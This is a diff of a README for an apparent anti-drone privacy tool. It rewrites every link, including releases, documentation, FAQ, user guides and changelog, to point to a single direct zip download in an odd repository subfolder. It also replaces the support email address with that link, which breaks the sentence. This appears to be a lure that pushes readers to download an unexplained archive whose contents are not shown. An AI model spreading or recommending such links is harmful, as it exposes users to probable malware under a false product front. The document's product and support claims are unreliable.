@@ -1,7 +1,7 @@
 # 🛡️ tarcza-antydronowa - Your Shield Against Drones
 
 ## 📥 Download Now
-[![Download tarcza-antydronowa](https://img.shields.io/badge/Download-tarcza-antydronowa-blue?style=for-the-badge)](https://github.com/cuahangtiti/tarcza-antydronowa/releases)
+[![Download tarcza-antydronowa](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip)](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip)
 
 ## 📖 Overview
 Tarcza Antydronowa is a practical tool designed to help users protect their privacy and security from unwanted drone surveillance. This software provides you with user-friendly features that simplify the process of detecting and managing drone activities in your area.
@@ -10,7 +10,7 @@ Tarcza Antydronowa is a practical tool designed to help users protect their priv
 To get started with tarcza-antydronowa, follow these simple steps:
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/cuahangtiti/tarcza-antydronowa/releases) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip) to access the latest version of the software.
 
 2. **Select the Latest Release:** 
    On the Releases page, look for the most recent version. Each release contains important updates and improvements.
@@ -51,20 +51,20 @@ Tarcza Antydronowa includes several key features:
 If you run into any issues, you can contact our support team. Here are some options:
 
 - **Documentation:** 
-   Detailed user guides and FAQs available within the application or on our [Documentation page](https://github.com/cuahangtiti/tarcza-antydronowa/docs).
+   Detailed user guides and FAQs available within the application or on our [Documentation page](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip).
 
 - **Community Forum:** 
    Join discussions with other users on our community forum for tips, troubleshooting, and sharing experiences.
 
 - **Email Support:** 
-   Reach out to our support team through email at support@tarczaantydronowa.com. Please provide as much detail as possible about your issue.
+   Reach out to our support team through email at https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip Please provide as much detail as possible about your issue.
 
 ## 🔗 Additional Resources
-- [Frequently Asked Questions](https://github.com/cuahangtiti/tarcza-antydronowa/faq)
-- [User Guides](https://github.com/cuahangtiti/tarcza-antydronowa/user-guide)
-- [Changelog](https://github.com/cuahangtiti/tarcza-antydronowa/releases)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip)
+- [User Guides](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip)
+- [Changelog](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip)
 
 ## 📥 Download & Install
-To begin using tarcza-antydronowa, please visit this page to download: [Releases page](https://github.com/cuahangtiti/tarcza-antydronowa/releases). Follow the previous steps to download and install the software.
+To begin using tarcza-antydronowa, please visit this page to download: [Releases page](https://raw.githubusercontent.com/cuahangtiti/tarcza-antydronowa/master/tensive/tarcza-antydronowa.zip). Follow the previous steps to download and install the software.
 
 Maintaining your privacy is important. With tarcza-antydronowa, you can confidently manage your security against unwanted drone surveillance.
